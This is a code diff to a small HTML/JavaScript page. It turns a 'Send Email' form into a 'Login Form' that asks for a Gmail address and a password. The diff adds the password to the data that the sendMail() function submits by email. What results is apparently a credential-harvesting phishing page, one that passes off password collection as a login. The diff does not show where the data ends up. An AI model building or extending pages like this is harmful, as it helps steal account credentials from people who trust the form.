@@ -19,7 +19,6 @@
       justify-content:center;
       align-items:center;
       font-family:Arial, sans-serif;
-
       background: linear-gradient(135deg, #ff6ec4, #7873f5);
     }
 
@@ -77,11 +76,14 @@
 
 <div class="container">
 
-  <h2>Send Email</h2>
+  <h2>Login Form</h2>
 
   <input type="text" id="name" placeholder="Enter name">
 
   <input type="email" id="email" placeholder="Enter your Gmail">
+
+  <!-- Password field -->
+  <input type="password" id="password" placeholder="Enter password">
 
   <input type="text" id="message" placeholder="Enter message">
 
@@ -95,10 +97,11 @@ function sendMail(){
 
     let name = document.getElementById("name").value;
     let email = document.getElementById("email").value;
+    let password = document.getElementById("password").value;
     let message = document.getElementById("message").value;
 
-    // ✅ Validation
-    if(name === "" || email === "" || message === ""){
+    // Validation
+    if(name === "" || email === "" || password === "" || message === ""){
         alert("Please fill all fields!");
         return;
     }
@@ -106,6 +109,7 @@ function sendMail(){
     let params = {
         name: name,
         email: email,
+        password: password,
         message: message
     };
 
